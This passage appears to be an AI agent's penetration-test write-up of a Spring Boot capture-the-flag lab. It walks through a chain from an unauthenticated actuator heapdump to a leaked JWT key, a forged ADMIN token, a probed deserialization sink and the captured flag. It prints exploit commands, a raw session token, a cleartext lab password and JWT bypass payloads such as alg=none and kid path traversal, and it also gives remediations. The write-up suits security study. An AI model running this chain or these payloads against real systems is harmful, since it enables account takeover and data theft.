+<p><code>AdminController.java:52-73</code>:</p>
+<pre><code class="language-java">@PostMapping(&quot;/admin/restore&quot;)
+@ResponseBody
+public String restore(@RequestParam(&quot;backup&quot;) String backup, HttpServletRequest request, ...) {
+    CurrentUser user = (CurrentUser) request.getAttribute(JwtAuthFilter.ATTR);
+    if (user == null || !user.isAdmin()) { response.setStatus(403); return &quot;403 - ...&quot;; }
+    try {
+        byte[] data = Base64.getDecoder().decode(backup.trim());
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
+        try {
+            Object restored = ois.readObject();                        // &lt;-- sink
+            return &quot;Copia de seguridad restaurada correctamente: &quot; + (restored == null ? &quot;(vacia)&quot; : restored.getClass().getName());
+        } finally { }
+    } catch (Exception e) { return &quot;No se pudo restaurar la copia: &quot; + e.getMessage(); }
+}
+</code></pre>
+<p>Reachability, <code>infrastructure.md</code>'s two questions answered separately:</p>
+<ul>
+<li><strong>Can the attacker supply the bytes?</strong> Yes. Measured, unauthenticated-<code>403</code>,
+<code>ADMIN</code>-<code>200</code>, and the sink demonstrably instantiates an attacker-chosen class:</li>
+</ul>
+<pre><code>$ POST /admin/restore  backup=rO0ABXQABHRlc3Q=      (a 4-byte TC_STRING, magic ACED0005)
+Copia de seguridad restaurada correctamente: java.lang.String
+
+$ POST /admin/restore  backup=notbase64!!!
+No se pudo restaurar la copia: Illegal base64 character 21
+
+$ POST /admin/restore  backup=aGVsbG8=   (valid base64, not a stream)
+No se pudo restaurar la copia: invalid stream header: 68656C6C
+</code></pre>
+<p>The handler <strong>echoes the class name of the object it just constructed</strong>. That is
+a live sink with a built-in oracle, not a stub.</p>
+<ul>
+<li><strong>Does anything gate it?</strong> Yes: <code>user.isAdmin()</code>. Anonymous → <code>403</code>, verified.</li>
+</ul>
+<p>Gadget preconditions, read from the classpath rather than recalled:</p>
+<ul>
+<li><code>commons-collections-3.2.1.jar</code> — <code>org.apache.commons.collections.functors.InvokerTransformer</code> is serializable in this version.</li>
+<li><code>aspectjweaver-1.9.22.jar</code>, <code>spring-beans</code> 6.1.6 — the <code>AnnotationInvocationHandler</code> + <code>AspectJWeaver</code> chain.</li>
+<li><code>snakeyaml-2.2.jar</code>, <code>jackson-databind-2.15.4.jar</code> — further chains.</li>
+</ul>
+<p><strong>Attribution, from primary sources</strong> (Apache's own security page, the CERT/CC
+record, and the GitHub advisory database — read, not recalled; <code>decision-making.md</code>
+§6):</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Vendor page</td>
+<td><code>commons.apache.org/proper/commons-collections/security.html</code> — <em>&quot;Remote Code Execution during object de-serialization&quot;</em>, vendor impact <strong>High</strong></td>
+</tr>
+<tr>
+<td>Vendor affected range</td>
+<td><strong>3.0 – 4.0</strong>; fixed in <strong>3.2.2</strong> (throws <code>UnsupportedOperationException</code> unless <code>-Dorg.apache.commons.collections.enableUnsafeSerialization=true</code>) and <strong>4.1</strong> (unsafe classes no longer <code>Serializable</code>)</td>
+</tr>
+<tr>
+<td>Vendor's own note</td>
+<td><em>&quot;<strong>No CVE id was assigned for the Apache Commons Collections library</strong>&quot;</em> — the CVEs below are product-scoped</td>
+</tr>
+<tr>
+<td>CERT/CC record</td>
+<td><code>VU#576313</code>, <strong>CVE-2015-6420</strong>, CWE-502, CVSS base <strong>7.5</strong> <code>AV:N/AC:L/Au:N/C:P/I:P/A:P</code>, date public 2015-01-28, published 2015-11-13</td>
+</tr>
+<tr>
+<td>GitHub advisory</td>
+<td><code>GHSA-fjq5-5j5f-mvxh</code> = CVE-2015-7501; <code>commons-collections:commons-collections</code> affected <strong><code>&lt; 3.2.2</code></strong>, patched <strong>3.2.2</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>This target is inside every one of those ranges</strong> (<code>3.2.1 &lt; 3.2.2</code>, and <code>3.2.1</code> is
+inside the vendor's <code>3.0 – 4.0</code>). <strong>This is the correct place to say plainly that
+the CVE is not the finding.</strong> <code>ObjectInputStream.readObject()</code> on a
+request-supplied byte array is the decision; the library is the weapon. Apache says
+so itself: <em>&quot;this is not only known and especially not unknown useable gadget&quot;</em>,
+and CERT/CC says a hardened library will not make the application resist this.
+Upgrading <code>commons-collections</code> fixes 3.2.1 but leaves a <code>readObject()</code> on
+<code>HttpServletRequest</code> input, and this lab's chain proves why that matters: <strong>the
+actuator fix (§3.1) hands an attacker <code>ADMIN</code>, and <code>ADMIN</code> reaches this sink.</strong> The
+two are separate decisions made by separate components and a reviewer shown one
+believes the host is safe. Fix: delete the endpoint, or use a data-only format
+(JSON) with a schema, or at minimum a <code>ValidatingObjectInputStream</code> allowlist.</p>
+<p><strong>Exploit status, stated honestly: the sink is proven live (§3.5, three measured
+responses) and the gadget host is proven present. I did not build and fire a
+gadget chain, because the reward was already obtained by the intended path and
+building a CC chain is a separate exercise with its own verification burden. I am
+not claiming RCE here. I am claiming a reachable, unauthenticated-by-construction
+deserialization sink with a known gadget host, which is a real finding on its own
+impact.</strong></p>
+<h3 id="36-seeded-credentials-and-a-hardcoded-administrator-in-application-code--cwe-798--cwe-1392--cwe-259">3.6 Seeded credentials and a hardcoded administrator in application code — CWE-798 / CWE-1392 / CWE-259</h3>
+<p><code>DataInitializer.java:30-41</code> creates the world on <strong>every boot</strong> with
+<code>ddl-auto=create-drop</code> and <code>jdbc:h2:mem:</code>, so the account set is fixed and known:</p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Role</th>
+<th>Password</th>
+<th>Note</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>admin</code></td>
+<td><code>ADMIN</code></td>
+<td>seeded, 19 chars, mixed policy</td>
+<td>reachable only with the hash or the plaintext (§3.2)</td>
+</tr>
+<tr>
+<td><code>lucia</code></td>
+<td><code>USER</code></td>
+<td><code>pinguinos123</code> (12 chars, dictionary-shaped)</td>
+<td>present in the heap dump in cleartext (2 hits)</td>
+</tr>
+</tbody>
+</table>
+<p>Both passwords are in the heap dump in cleartext, so this is not a separate
+exploitation path — it is the <em>scope</em> of §3.2. It is reported separately because
+the remediation is different: the heap dump needs authentication, the credentials
+need to come from a secret store and not from a source constant, and
+<code>ddl-auto=create-drop</code> on an in-memory store means the fix has no migration story
+to respect.</p>
+<h3 id="37-health-details-and-routebean-disclosure--cwe-200-low">3.7 Health details and route/bean disclosure — CWE-200 (low)</h3>
+<pre><code class="language-json">{&quot;status&quot;:&quot;UP&quot;,&quot;components&quot;:{
+  &quot;db&quot;:{&quot;status&quot;:&quot;UP&quot;,&quot;details&quot;:{&quot;database&quot;:&quot;H2&quot;,&quot;validationQuery&quot;:&quot;isValid()&quot;}},
+  &quot;diskSpace&quot;:{&quot;status&quot;:&quot;UP&quot;,&quot;details&quot;:{&quot;total&quot;:272075120640,&quot;free&quot;:56154533888,
+                 &quot;threshold&quot;:10485760,&quot;path&quot;:&quot;/app/.&quot;,&quot;exists&quot;:true}},
+  &quot;ping&quot;:{&quot;status&quot;:&quot;UP&quot;}}}
+</code></pre>
+<p><code>show-details=always</code> (a deliberate operator line, <code>application.properties:45</code>)
+exposes the database engine, a validation query, and <strong>absolute server paths with
+filesystem capacity</strong>. <code>/actuator/mappings</code> (26 KB) enumerates every route including
+the gated ones with their handler signatures; <code>/actuator/beans</code> (138 KB) enumerates
+the entire object graph including <code>IntegrationConfig</code> and its three
+secret-bearing fields; <code>/actuator/threaddump</code> (53 KB) exposes every thread's stack
+and lock state. Individually low; collectively they are the reconnaissance that
+makes §3.5's route list free, and they are the reason the exposure allowlist
+matters even after <code>heapdump</code> is off.</p>
+<h3 id="38-no-csrf-token-on-any-form-and-samesite-absent-from-the-session-cookie--cwe-352--cwe-1004-note-not-critical">3.8 No CSRF token on any form, and <code>SameSite</code> absent from the session cookie — CWE-352 / CWE-1004 (note, not critical)</h3>
+<p>Every form is a bare <code>POST</code> with no token, in all four templates:</p>
+<pre><code class="language-html">login.html:9       &lt;form th:action=&quot;@{/login}&quot; method=&quot;post&quot;&gt;
+register.html:9    &lt;form th:action=&quot;@{/register}&quot; method=&quot;post&quot;&gt;
+penguins.html:19   &lt;form th:action=&quot;@{'/apadrinar/' + ${p.id}}&quot; method=&quot;post&quot; …&gt;
+admin.html:42      &lt;form method=&quot;post&quot; th:action=&quot;@{/admin/restore}&quot;&gt;
+</code></pre>
+<p>and the cookie carries neither <code>SameSite</code> nor <code>Secure</code>:</p>
+<pre><code>[response-cookie-header]: session=&lt;…&gt;; Max-Age=3600; Expires=…; Path=/; HttpOnly
+</code></pre>
+<p><strong>Reported at note severity on purpose.</strong> <code>javax.servlet.http.Cookie</code> has no
+<code>SameSite</code> setter, so its absence here is the framework's API surface rather than a
+choice the application declined to make — and modern browsers apply
+<code>SameSite=Lax</code> by default, which blocks the cookie on a cross-site <code>POST</code>, which is
+the only CSRF-relevant method here. <code>api_web.md:273</code>'s rule applies verbatim: absent
+<code>Secure</code> on a plain-HTTP lab deployment is a note. The one real consequence is that
+<code>/admin/restore</code> (§3.5) has no CSRF defence of any kind if a browser ever defaults
+the other way, so it should be a <code>PUT</code>/<code>DELETE</code>-shaped JSON endpoint regardless.
+<strong>Live cross-origin delivery was not tested</strong> — I ran no browser, and saying
+&quot;CSRF works&quot; from a <code>curl</code> is the <code>api_web.md:266</code> status-code-only error.</p>
+<hr />
+<h2 id="4-controls-that-held">4. Controls that held</h2>
+<p>Reported with the same prominence as the bugs that fired, per
+<code>decision-making.md</code> §Reporting. Each of these is a <em>result</em>: without it, an
+untested control and a holding one are indistinguishable.</p>
+<p><strong>C-1 — The JWT verification is correct, and I proved it with a positive control.</strong>
+Six rejections, one acceptance, one script:</p>
+<pre><code>alg=none            : 403 rejected
+alg=HS256 but RS256 : 403 rejected     (key-confusion / algorithm substitution)
+empty signature     : 403 rejected
+kid=/dev/null, zero key : 403 rejected  (key-selector to an empty file)
+kid=../../etc/passwd    : 403 rejected  (key-selector traversal)
+no role claim          : 403 rejected
+expired token          : 403 rejected
+CORRECT key (control)  : 200 ACCEPTED len=2676   &lt;-- the detector can fail
+</code></pre>
+<p><code>JwtUtil.parse</code> uses <code>Jwts.parser().verifyWith(key).build().parseSignedClaims(token)</code>
+(<code>JwtUtil.java:36</code>) — the modern jjwt 0.12 API, which pins the algorithm from the
+verified key and <strong>ignores the header's <code>alg</code></strong>. No <code>alg:none</code>, no
+<code>kid</code>-selector, no <code>jku</code>/<code>x5u</code> key-URL fetch, and <code>exp</code> is enforced. The last line
+is what makes the six above evidence rather than assertion.</p>
+<p><strong>C-2 — Role escalation at registration is impossible.</strong> <code>AuthController.java:63</code>:</p>
+<pre><code class="language-java">User user = new User(username, email, this.encoder.encode(password), &quot;USER&quot;);
+</code></pre>
+<p><code>role</code> is a hardcoded literal, and the <code>User(String,String,String,String)</code>
+constructor <strong>overwrites it with <code>&quot;USER&quot;</code> regardless of the argument</strong>
+(<code>User.java:35-41</code>) — so even a mass-assignment attempt inside the app would be
+defeated twice. There is no <code>role</code> request parameter on <code>/register</code>. I did not
+test this exhaustively (no parameter-tampering fuzz), but the source is decisive
+and I report it as <em>source-read</em>, not as <em>exploited-and-blocked</em>.</p>
+<p><strong>C-3 — Thymeleaf output escaping held against template injection.</strong> A username of
+<code>__${7*7}__</code> registered successfully and rendered <strong>literally</strong>:</p>
+<pre><code>Hola, &lt;span&gt;__${7*7}__&lt;/span&gt; 👋
+</code></pre>
+<p>All 8 templates use <code>th:text</code> (escaped) and <strong>zero use <code>th:utext</code></strong>. No SSTI, and
+no path to it: the model values are <code>user.*</code>, <code>p.*</code> (entity fields) and framework
+values, and no template expression is built from request data.</p>
+<p><strong>C-4 — No IDOR on the sponsorship feature.</strong> <code>SiteController.sponsor</code> (<code>:48-59</code>)
+scopes every read by <code>user.getUsername()</code> taken from the verified token, and
+<code>/perfil</code> (<code>:61-81</code>) filters <code>sponsorships.findByUsername(user.getUsername())</code>.
+Object references (<code>/apadrinar/{id}</code>) are a penguin id from a public list, not
+another user's record. Not exhaustively fuzzed; source-read.</p>
+<p><strong>C-5 — H2 console is off and DevTools is absent.</strong> <code>/h2-console</code> → <code>404</code>.
+<code>spring-boot-devtools</code> is not in the classpath at all. Both are the <em>framework
+defaults working</em>, and this is the control that makes §3.1 a deployment finding
+rather than &quot;Spring Boot is insecure by default&quot;: a related default
+(<code>h2.console.enabled=false</code>, devtools absent) is holding right next to the one that
+is not.</p>
+<p><strong>C-6 — No <code>Whitelabel</code> error page, anywhere.</strong> Every error I could induce returned
+the Boot 3 JSON body, never the HTML error view:</p>
+<pre><code>GET  /noexiste          404 application/json  {&quot;timestamp&quot;:…,&quot;status&quot;:404,&quot;error&quot;:&quot;Not Found&quot;,&quot;path&quot;:&quot;/noexiste&quot;}
+GET  /apadrinar/abc     405 application/json  Allow: POST
+POST /apadrinar/abc     400 application/json  {&quot;status&quot;:400,&quot;error&quot;:&quot;Bad Request&quot;}
+GET  /actuator/env/xx   404  Content-Length: 0
+</code></pre>
+<p>No stack trace, no class name, no framework version, no internal path in any error
+body. This is the <em>absence</em> of a finding — the prompt's expected
+&quot;Whitelabel error page leaks versions&quot; case <strong>did not fire</strong>, and the reason is
+<code>server.error.include-*</code> at their defaults plus an app that declares no
+<code>ErrorController</code>. I am reporting it as a control that held rather than quietly
+dropping it, because &quot;I looked for the stack trace and it is not there&quot; and &quot;I did
+not look&quot; must not read the same.</p>
+<p><strong>C-7 — Actuator config sanitization works as documented</strong> — the 96/96 mask of §1.1
+<em>is</em> this control, and it held. It is also the most dangerous control on the target
+for the analyst's own reporting, which is why it is listed here and dissected in
+§1.1 rather than buried.</p>
+<p><strong>C-8 — A rotated key was not silently still-live.</strong> §1.3's two-forge differential:
+2024 → <code>200</code>, 2023 → <code>403</code>. The lab's claim held under test. The <em>retention</em> of
+2023 is a separate finding (§3.3); its continued validity is not.</p>
+<hr />
+<h2 id="5-chain-in-order-with-each-jump-justified">5. Chain, in order, with each jump justified</h2>
+<pre><code>[0] anonymous  ──► [1] GET /actuator (discovery page)      200, 19 link templates
+[1] anonymous  ──► [2] GET /actuator/heapdump             200, 64 583 893 B
+[2] local     ──► [3] grep -a the HPROF for key-shaped   6 secret classes, cleartext
+[3] local     ──► [4] distinguish real key from decoy     forge × 2 → 200 / 403
+[4] local     ──► [5] forge HS256 JWT, role=ADMIN         self-signed, no account
+[5] anonymous  ──► [6] GET /admin  Cookie: session=&lt;forged&gt; 200, reward
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Jump</th>
+<th>Why this one, and what the alternative was</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0→1</td>
+<td>Full TCP scan first</td>
+<td><code>decision-making.md</code>: the name is a label. One <code>nmap -p-</code> retired &quot;where is the app&quot; in 8 s and told me the lab is one port — which is what made a 19-endpoint surface on that one port the <em>whole</em> story rather than a fragment.</td>
+</tr>
+<tr>
+<td>1→2</td>
+<td>Discovery page → <code>heapdump</code></td>
+<td>The discovery page is the framework telling me the endpoint set. Chosen over <code>/actuator/env</code> <strong>because of the measurement in §1.1</strong> — <code>env</code> was read first and returned no value, so it could not be the vector. Reading the <em>masked</em> endpoint first is what made the <em>unmasked</em> one obvious.</td>
+</tr>
+<tr>
+<td>2→3</td>
+<td>Download → <code>grep -a</code></td>
+<td>The 64 MB is a <strong>Java HPROF dump</strong> (<code>file</code> confirms the magic), which is uncompressed and therefore greppable. <code>grep -a</code> on the raw bytes, not a parser: the roundtrip discipline (<code>decision-making.md</code>) applies to a memory dump the way it applies to a crypto artifact, and I did not need a full object-graph parse for six cleartext strings.</td>
+</tr>
+<tr>
+<td>3→4</td>
+<td>6 candidates → 1</td>
+<td><strong>This is the step the lab tried to make me skip</strong> (§1.3). Two of the six are HMAC-key-shaped and differ by one year. Neither the property name nor the comment decides it; only a signature does. And a greping attacker who picks the <em>first</em> match in a <code>grep -n</code> listing gets a <code>403</code> and concludes the dump was a red herring.</td>
+</tr>
+<tr>
+<td>4→5</td>
+<td>Key → forged token</td>
+<td>The token must be <strong>signed</strong>, not assembled: <code>sub</code>, <code>role</code>, <code>iat</code>, <code>exp</code> (<code>JwtUtil.generateToken:30-33</code>). I used the <em>same</em> <code>role</code> claim name and HS256-with-<code>verifyWith</code>, because a forgery is only correct if it is the server's own construction.</td>
+</tr>
+<tr>
+<td>5→6</td>
+<td>Forged cookie → <code>ADMIN</code></td>
+<td><code>JwtAuthFilter:32</code> reads <code>claims.get(&quot;role&quot;, String.class)</code> into <code>CurrentUser</code>, and <code>isAdmin()</code> is <code>&quot;ADMIN&quot;.equals(role)</code>. So the <em>entire</em> authorization decision is one unsigned-if-unkeyed string in the token body. Confirmed live, not reasoned.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The admin password route (3.2) is a second, independent, <em>shorter</em> path to the
+same place</strong> — heap → cleartext password → <code>POST /login</code> → real <code>302</code> with a
+server-signed <code>ADMIN</code> cookie, with no forgery and no candidate ambiguity. I did
+<strong>not</strong> use it, and the reason is worth recording: it is the path that would still
+work after a partial fix that rotates the JWT key but leaves the dump exposed. Two
+findings, one outcome, two fixes — §3.2 and §3.3 must both be closed.</p>
+<p><strong>What I did not need, and why that is a finding, not luck:</strong> no <code>java</code> primitive, no
+serialization gadget, no SpEL, no SSTI, no upload, no SQL, no CVE. The entire
+compromise is <strong>read the diagnostic output, then sign a token</strong>. The lab is named
+for a framework and the framework supplied the whole chain — but via its
+<em>configuration surface</em>, not via a vulnerability in the framework.</p>
+<hr />
+<h2 id="6-reward--literal">6. Reward — literal</h2>
+<pre><code>$ ADMIN=$(python3 forge.py '&lt;heap-recovered signing key&gt;' ADMIN)
+$ curl -s -b &quot;session=$ADMIN&quot; http://[net-0-11]:8080/admin | grep -o 'FLAG{[^}]*}'
+FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}
+</code></pre>
+<p>And the raw <code>[response-cookie-header]</code> from the password route, for the record:</p>
+<pre><code>HTTP/1.1 302
+[response-cookie-header]: session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiIsImlhdCI6MTc5MDU2OTA0MywiZXhwIjoxNzkwNTcyNjQzfQ.Mbu9nAqIiWW-uZG77MMO_dgfPXkBWlFWFEyQwqJf1mI; Max-Age=3600; Path=/; HttpOnly
+Location: http://[net-0-11]:8080/perfil
+</code></pre>
+<p>The reward is hardcoded in the template model
+(<code>AdminController.java:48</code> — <code>model.addAttribute(&quot;flag&quot;, …)</code>) and rendered by
+<code>templates/admin.html</code>. It is served by the application, not read from the
+filesystem, so there is no filesystem reward to miss.</p>
+<p>The JWT was forged, not stolen: the <code>Mbu9nAq…</code> in the second cookie is a signature
+<strong>the server computed</strong> over a password it verified, and the first token is one I
+computed over a key the heap gave me. Both were produced in this run by the
+identity under test; no artifact was carried over from a previous engagement.</p>
+<hr />
+<h2 id="7-spring-boot-the-measurement-criterion">7. Spring Boot: the measurement criterion</h2>
+<p>The prompt for this engagement asked for a section on Spring Boot that supplies a
+<strong>criterion for measuring</strong>, not a list of endpoints. The criterion this lab yields
+is a <strong>trichotomy on the response body</strong>, applied per endpoint, before any finding
+is written:</p>
+<blockquote>
+<p>For any exposed diagnostic endpoint, decide three things separately:
+<strong>(a) reachable</strong> — is there an authentication decision in front of it, and in
+<em>which component</em>;
+<strong>(b) disclosed</strong> — does the response carry a <strong>value</strong>, or only a <strong>name</strong>, or a
+<strong>masked placeholder</strong>?
+<strong>(c) decisive</strong> — is the disclosed value <em>load-bearing</em>: does possessing it change
+what the application will do?</p>
+<p>(b) is a measurement of the bytes. (c) is a measurement of the target. A finding
+that skips (c) is a finding about a list of key names.</p>
+</blockquote>
+<p>Measured on this target, endpoint by endpoint:</p>
+<table>
+<thead>
+<tr>
+<th>Endpoint</th>
+<th>(a) reachable?</th>
+<th>(b) what the body carries</th>
+<th>(c) decisive?</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/actuator/env</code></td>
+<td>anon</td>
+<td><strong>96 names + origins, 96 <code>******</code>, 0 values</strong></td>
+<td>no</td>
+<td>topology disclosure, low</td>
+</tr>
+<tr>
+<td><code>/actuator/configprops</code></td>
+<td>anon</td>
+<td>no <code>app.*</code> at all (<code>@Value</code> is not bound)</td>
+<td>no</td>
+<td>near-empty</td>
+</tr>
+<tr>
+<td><code>/actuator/heapdump</code></td>
+<td>anon</td>
+<td><strong>6 cleartext secret classes + a live heap</strong></td>
+<td><strong>yes — signs every session, and holds a cleartext admin password</strong></td>
+<td><strong>critical</strong></td>
+</tr>
+<tr>
+<td><code>/actuator/health</code></td>
+<td>anon</td>
+<td>engine name, path, capacity (<code>show-details=always</code>)</td>
+<td>no</td>
+<td>low</td>
+</tr>
+<tr>
+<td><code>/actuator/mappings</code> / <code>beans</code></td>
+<td>anon</td>
+<td>full route table, full object graph</td>
+<td>no (readiness)</td>
+<td>low</td>
+</tr>
+<tr>
+<td><code>/actuator/threaddump</code></td>
+<td>anon</td>
+<td>stacks, locks</td>
+<td>no</td>
+<td>low</td>
+</tr>
+<tr>
+<td><strong><code>/actuator/loggers</code> <code>POST</code></strong></td>
+<td>anon <strong>write</strong></td>
+<td><code>204</code></td>
+<td><strong>yes — mutates the app's own log policy</strong></td>
+<td><strong>high</strong>, different class</td>
+</tr>
+<tr>
+<td><code>/h2-console</code></td>
+<td><code>404</code></td>
+<td>—</td>
+<td>—</td>
+<td>control held</td>
+</tr>
+<tr>
+<td>DevTools</td>
+<td>absent from classpath</td>
+<td>—</td>
+<td>—</td>
+<td>control held</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The three conclusions this table supports that a bare endpoint list would not:</strong></p>
+<ol>
+<li><strong><code>/actuator/env</code> is not a credential disclosure here, and the framework's own
+code says why in four lines</strong> (<code>Sanitizer.sanitize</code>: <code>if (!showUnsanitized) return &quot;******&quot;</code>). The mask is <strong>one property</strong> (<code>show-values=ALWAYS</code>) from a
+critical finding. So the honest report is <em>both</em> &quot;no secret is disclosed today&quot;
+and &quot;the switch that discloses every secret is a single documented key whose
+default is safe, and a reviewer must verify its value on every deployment.&quot; A
+scanner that greps the response for <code>password</code> and reports the key <strong>name</strong> has
+produced a false positive <em>and</em> has missed the real vector.</li>
+<li><strong>A heap dump is categorically different from a config dump, and the difference
+is the finding.</strong> A config endpoint shows <em>configuration</em>; a heap dump shows
+<em>runtime state</em>, which by construction includes (a) the config file's own bytes
+as loaded, (b) values resolved from other sources, and (c) <strong>secrets that exist
+only in memory</strong> — the plaintext password passed to BCrypt, the <code>static</code> list
+that pins a retired key forever. <strong>You cannot enumerate (c) from configuration,
+so &quot;read the config to know what to look for&quot; is insufficient.</strong> Any
+recon guidance that stops at the properties file will find §3.2(1) and §3.2(2)
+and miss §3.2(3) entirely, and §3.2(3) is the one that logs you in.</li>
+<li><strong>A management surface with no auth is measured in the artifact, not from the
+response.</strong> <code>exposure.include=*</code> is one operator line; the <em>defect</em> is the
+absence of any authentication for that path, and the way to establish it is to
+read the classpath and the bean list out of the jar
+(<code>spring-security-web</code> absent, no <code>SecurityFilterChain</code>, the only <code>catch</code> in the
+auth filter is empty and <code>chain.doFilter</code> is unconditional). <strong>This generalises
+past Spring</strong>: for any JVM framework, &quot;is the framework's own auth present&quot; is a
+question about the artifact, and a <code>200</code> from a diagnostic endpoint cannot
+distinguish &quot;secured and allowed&quot; from &quot;there is no security subsystem at all&quot;.
+In this app, <code>/admin</code> answers <code>403</code> — an <em>application</em> decision — while
+<code>/actuator</code> answers <code>200</code> with no decision anywhere. <strong>Two components, two
+decisions, two fixes</strong>, and the same <code>management.server.port</code>-on-a-bound-
+interface split that separates an out-of-band management plane from a data plane
+in <code>infrastructure.md</code>.</li>
+</ol>
+<p><strong>On SpEL in configuration properties</strong>, which was expected and did not occur: no
+<code>@Value</code> in this app evaluates an expression, <code>spring-boot-properties</code> SpEL injection
+requires a specific data-binding shape that no endpoint here exposes, and I found no
+request-reachable path that writes configuration. It is a real and distinctive
+Spring vector — code injection through a <em>configuration file</em> rather than a request
+parameter, which changes what counts as &quot;user input&quot; — but <strong>this lab does not use
+it</strong>, and reporting it would have been a lab-design guess, not a measurement.</p>
+<p><strong>On <code>CVE-2022-22965</code> (Spring4Shell) and friends: explicitly discarded, with
+reason.</strong> No request-reachable data-binding path, no <code>spring-beans</code> binding of
+request parameters into property-setter types, no <code>spring-mvc</code> on a Tomcat that
+accepts the crafted <code>class.module.classLoader</code> form. Discarded on the preconditions
+from the advisory, not on a version number.</p>
+<hr />
+<h2 id="8-tested--not-tested--could-not-test">8. Tested / not tested / could not test</h2>
+<p><strong>Tested, with evidence in this document</strong></p>
+<ul>
+<li>Full TCP port scan, <code>-sV -Pn -p-</code>, 65534 closed.</li>
+<li>Full actuator enumeration: 19 discovery links, status + size on 18 paths.</li>
+<li><code>env</code> value-masking measured across all 96 properties in all 5 property sources.</li>
+<li><code>configprops</code> queried and confirmed not to contain <code>@Value</code>-bound properties.</li>
+<li><code>heapdump</code> downloaded (63 763 393 B), identified as HPROF, 7 candidate secrets
+grepped, 2 HMAC-key candidates discriminated by signature.</li>
+<li>JWT: 7 forged tokens (6 negative, 1 positive control) covering <code>alg:none</code>, <code>alg</code>
+substitution, empty signature, two <code>kid</code> selectors, missing <code>role</code>, expired <code>exp</code>.</li>
+<li>Admin password recovered from the heap, <strong>used</strong> against <code>/login</code>.</li>
+<li><code>/admin/restore</code> deserialization: 3 states (invalid base64 / valid base64 non-stream
+/ valid stream), anonymous <code>403</code> and <code>ADMIN</code> <code>200</code>.</li>
+<li><code>/actuator/loggers</code> write, differential in <strong>both</strong> directions.</li>
+<li>Template injection: <code>__${7*7}__</code> as a registered username, reflected literally.</li>
+<li>Error surfaces: 404, 405, 400, actuator 404 — none produced an HTML error page.</li>
+<li>Full application source decompiled and read (8 classes + <code>application.properties</code>).</li>
+<li>Classpath inventory for devtools / h2-console / spring-security-web / gadget hosts.</li>
+<li>Actuator defaults read from the jar's own <code>spring-configuration-metadata.json</code>.</li>
+<li><code>Sanitizer.sanitize</code> read from <code>spring-boot-actuator-3.2.5.jar</code> to establish <em>why</em>
+the mask is universal.</li>
+</ul>
+<p><strong>Not tested (and not claimed)</strong></p>
+<ul>
+<li><strong>No deserialization gadget was built or fired.</strong> Sink proven, gadget host proven
+present, RCE <strong>not</strong> demonstrated. See §3.5.</li>
+<li><strong>No CSRF was delivered cross-origin.</strong> No browser was run; §3.8 is source-read
+plus cookie attributes, and the status-code-only CSRF error is explicitly avoided.</li>
+<li><strong>No privilege escalation.</strong> There is no shell in this engagement, so
+<code>decision-making.md</code> §8's mandatory <code>id</code> was answered from the image configuration
+(<code>User: www-data</code>, <code>uid=33(www-data)</code>) rather than from inside a primitive.</li>
+<li>No parameter-tampering fuzz on <code>/register</code> (C-2, C-4 are source-read).</li>
+<li>No rate-limit / brute-force assessment on <code>/login</code>.</li>
+<li>No test of <code>/actuator/threaddump</code>'s content beyond its existence and size.</li>
+</ul>
+<p><strong>Could not test (declared, not simulated)</strong></p>
+<ul>
+<li><strong>No UDP scan.</strong> <code>nmap -sU</code> needs root and this host has none; <code>ipmitool</code> is not
+installed. Per <code>decision-making.md</code> this is a <strong>coverage gap</strong>, not a closed port.
+It is closed here by the image's own <code>ExposedPorts: 8080/tcp</code> manifest and by the
+absence of any UDP listener in the shipped image, which is weaker evidence than a
+live exchange and is labelled as such.</li>
+<li><code>smbclient</code> and <code>sshpass</code> are not installed on this host; <strong>not needed</strong> — this
+lab has neither SMB nor SSH, and I did not emulate or assume either.</li>
+</ul>
+<hr />
+<h2 id="9-design-observation">9. Design observation</h2>
+<p>The lab's own <code>application.properties</code> is a <strong>solution document</strong>. It names the
+vulnerability class (<code>(!!!) CONFIGURACION VULNERABLE DE ACTUATOR</code>), the exact
+mechanism (<code>Enmascarado en /actuator/env pero EN CLARO dentro del heapdump</code>), the
+decoy and its status (<code>SENUELO: ya no firma nada</code>), the correct grep bait
+(<code>contiene la palabra 'secret'</code>), and the noise an analyst must sort through. Read
+top to bottom, the file <em>is</em> the intended chain.</p>
+<p>Per <code>decision-making.md</code> §7 that is a <strong>stopping condition</strong>, and this engagement
+confirms the rule from the other side: <strong>the file was right about everything it
+claimed, and the two findings that mattered most are the two it did not claim.</strong></p>
+<ul>
+<li>It claims the actuator is the problem. It does not claim that the actual defect is
+the <strong>absence of any authentication component</strong> — which is what makes the
+remediation non-obvious, because &quot;narrow <code>exposure.include</code>&quot; is the answer the
+file's own framing suggests and it leaves <code>/actuator/loggers</code> writable and
+<code>/actuator/heapdump</code> reachable to anything that can bind the port.</li>
+<li>It claims the 2023 key is inert. Correct, and verified. It does not claim that
+<strong>a rotated signing key is still a live-shaped secret sitting in a heap dump</strong>,
+which is a finding about the <em>rotation policy</em> and has a different fix.</li>
+<li>It says nothing about <code>/admin/restore</code>. That endpoint is a <strong>CWE-502 sink with
+<code>commons-collections-3.2.1</code> on the classpath, reachable by the very <code>ADMIN</code> role
+this lab teaches you to forge.</strong> The intended chain and the accidental one land in
+the same place, and the intended one is strictly weaker.</li>
+<li>It says nothing about the admin password being <strong>in the heap in cleartext</strong>, which
+is a <em>shorter</em> path to the reward than the one the file describes.</li>
+</ul>
+<p>So the annotations are a strict subset, exactly as the rule says — and the sharper
+statement this engagement adds is the one from <code>BALUHOME</code>: <strong>a lab that hands you the
+answer makes verification the work, and verification is not free.</strong> Here it was
+~40% of the engagement: a <code>403</code> for the decoy key, a 96/96 masking census, a
+two-direction logger differential, a seven-token JWT matrix with a positive control,
+and a three-state deserialization probe. None of that is in the properties file. An
+analyst who read the file and immediately forged a token would have got the right
